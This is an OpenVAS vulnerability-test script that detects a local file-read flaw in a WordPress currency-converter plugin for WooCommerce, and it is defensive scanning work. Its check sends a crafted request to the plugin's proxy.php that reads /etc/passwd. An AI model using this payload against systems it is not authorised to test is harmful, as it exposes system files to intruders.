###############################################################################
# OpenVAS Vulnerability Test
# $Id: gb_wp_paypal_woocommerce_lfi_vuln.nasl 6551 2017-07-06 09:58:21Z teissa $
#
# WordPress Paypal Currency Converter Basic For Woocommerce File Read Vulnerability
#
# Authors:
# Deependra Bapna <bdeepednra@secpod.com>
#
# Copyright:
# Copyright (C) 2015 Greenbone Networks GmbH, http://www.greenbone.net
#
# This program is free software; you can redistribute it and/or modify
# it under the terms of the GNU General Public License version 2
# (or any later version), as published by the Free Software Foundation.
#
# This program is distributed in the hope that it will be useful,
# but WITHOUT ANY WARRANTY; without even the implied warranty of
# MERCHANTABILITY or FITNESS FOR A PARTICULAR PURPOSE. See the
# GNU General Public License for more details.
#
# You should have received a copy of the GNU General Public License
# along with this program; if not, write to the Free Software
# Foundation, Inc., 51 Franklin St, Fifth Floor, Boston, MA 02110-1301 USA.
###############################################################################

CPE = "cpe:/a:wordpress:wordpress";

if(description)
{
  script_oid("1.3.6.1.4.1.25623.1.0.805700");
  script_version("$Revision: 6551 $");
  script_tag(name:"cvss_base", value:"7.8");
  script_tag(name:"cvss_base_vector", value:"AV:N/AC:L/Au:N/C:C/I:N/A:N");
  script_tag(name:"last_modification", value:"$Date: 2017-07-06 11:58:21 +0200 (Thu, 06 Jul 2017) $");
  script_tag(name:"creation_date", value:"2015-06-15 13:39:51 +0530 (Mon, 15 Jun 2015)");
  script_name("WordPress Paypal Currency Converter Basic For Woocommerce File Read Vulnerability");

  script_tag(name:"summary", value:"This host is installed with Wordpress
  Paypal Currency Converter Basic For Woocommerce and is prone to file read
  vulnerability.");

  script_tag(name:"vuldetect", value:"Send a crafted data via HTTP GET request
  and check whether it is able to read arbitrary files or not.");

  script_tag(name:"insight", value:"The flaw is due to the 'proxy.php' script
  is not properly sanitizing user input via the 'requrl' parameter.");

  script_tag(name:"impact", value:"Successful exploitation will allow remote
  attackers to read arbitrary files.

  Impact Level: Application");

  script_tag(name:"affected", value:"Wordpress Paypal Currency Converter Basic
  For Woocommerce versions 1.3 or less");

  script_tag(name:"solution", value:"Upgrade to Wordpress Paypal Currency
  Converter Basic For Woocommerce version 1.4 or later.
  For updates refer to
  https://wordpress.org/plugins/paypal-currency-converter-basic-for-woocommerce");

  script_tag(name:"solution_type", value:"VendorFix");

  script_tag(name:"qod_type", value:"exploit");

  script_xref(name : "URL" , value : "http://www.exploit-db.com/exploits/37253");
  script_xref(name : "URL" , value : "https://packetstormsecurity.com/files/132278");
  script_category(ACT_ATTACK);
  script_copyright("Copyright (C) 2015 Greenbone Networks GmbH");
  script_family("Web application abuses");
  script_dependencies("secpod_wordpress_detect_900182.nasl");
  script_mandatory_keys("wordpress/installed");
  script_require_ports("Services/www", 80);
  exit(0);
}


include("http_func.inc");
include("http_keepalive.inc");
include("host_details.inc");

## Variable Initialization
dir = "";
url = "";
sndReq = "";
rcvRes = "";

## Get HTTP Port
if(!http_port = get_app_port(cpe:CPE)){
  exit(0);
}

## Get WordPress Location
if(!dir = get_app_location(cpe:CPE, port:http_port)){
  exit(0);
}

## Vulnerable URL
url = dir + '/wp-content/plugins/paypal-currency-converter-basic-for-woocommerce'
          + '/proxy.php?requrl=/etc/passwd';

sndReq = http_get(item:url,  port:http_port);
rcvRes = http_keepalive_send_recv(port:http_port, data:sndReq);

## Try attack and check the response to confirm vulnerability
if( http_vuln_check( port:http_port, url:url, pattern:"root:.*:0:[01]:" ) )
{
  report = report_vuln_url( port:http_port, url:url );
  security_message(port:http_port, data:report);
  exit(0);
}
